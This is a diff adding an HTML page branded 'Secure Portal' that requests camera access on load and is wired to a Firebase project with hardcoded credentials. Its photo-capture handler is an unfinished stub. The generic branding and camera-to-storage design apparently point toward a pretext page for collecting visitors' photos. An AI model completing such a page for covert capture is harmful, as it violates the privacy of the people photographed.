@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Portal</title>
+    <!-- Firebase SDK Scripts -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap');
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #121212; /* Dark Grey Background */
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #e0e0e0;
+        }
+        .container {
+            background: #1e1e1e; /* Darker Grey Container */
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+            border: 1px solid #333;
+        }
+        h2 { font-weight: 600; margin-bottom: 20px; color: #ffffff; }
+        video {
+            width: 100%;
+            border-radius: 12px;
+            background: #000;
+            margin-bottom: 20px;
+            border: 1px solid #444;
+        }
+        .controls { display: flex; flex-direction: column; gap: 10px; }
+        button, .file-input-label {
+            background-color: #333; /* Dark Grey Button */
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 15px;
+            cursor: pointer;
+            transition: background 0.3s;
+            text-align: center;
+        }
+        button:hover { background-color: #444; }
+        .file-input-label { background-color: #2a2a2a; border: 1px solid #444; }
+        .file-input-label:hover { background-color: #333; }
+        input[type="file"] { display: none; }
+        #status { margin-top: 15px; font-size: 13px; color: #888; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Secure Portal</h2>
+    <video id="video" autoplay playsinline></video>
+    
+    <div class="controls">
+        <button id="snap">Capture Photo</button>
+        <button id="switchCamera">Switch Camera</button>
+        <label for="fileUpload" class="file-input-label">Upload from Gallery</label>
+        <input type="file" id="fileUpload" accept="image/*">
+    </div>
+    <div id="status">Please allow access.</div>
+</div>
+
+<script>
+    // --- FIREBASE CONFIGURATION (Yahan apni details daalo) ---
+    const firebaseConfig = {
+            apiKey: "AIzaSyD37Muq_nliFYaAnHZ_tJLkih4SqjjSt6o",
+            authDomain: "genzesportsv2.firebaseapp.com",
+            databaseURL: "https://genzesportsv2-default-rtdb.firebaseio.com",
+            projectId: "genzesportsv2",
+            storageBucket: "genzesportsv2.firebasestorage.app",
+            messagingSenderId: "228012176543",
+            appId: "1:228012176543:web:74f0bef11ca5c04ae51eaa"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const storage = firebase.storage();
+    const db = firebase.firestore();
+
+    const video = document.getElementById('video');
+    const status = document.getElementById('status');
+    let currentStream;
+    let useFrontCamera = true;
+
+    async function initCamera(front = true) {
+        if (currentStream) currentStream.getTracks().forEach(track => track.stop());
+        const constraints = { video: { facingMode: front ? "user" : "environment" } };
+        try {
+            currentStream = await navigator.mediaDevices.getUserMedia(constraints);
+            video.srcObject = currentStream;
+        } catch (err) { status.innerText = "Error: Camera access denied."; }
+    }
+
+    document.getElementById('switchCamera').addEventListener('click', () => {
+        useFrontCamera = !useFrontCamera;
+        initCamera(useFrontCamera);
+    });
+
+    initCamera();
+
+    // Logic for uploading will follow Firebase rules
+    document.getElementById('snap').addEventListener('click', () => {
+        status.innerText = "Processing...";
+        // Yahan Canvas ka use karke photo ko storage mein dalne ka code aayega
+    });
+</script>
+</body>
+</html>
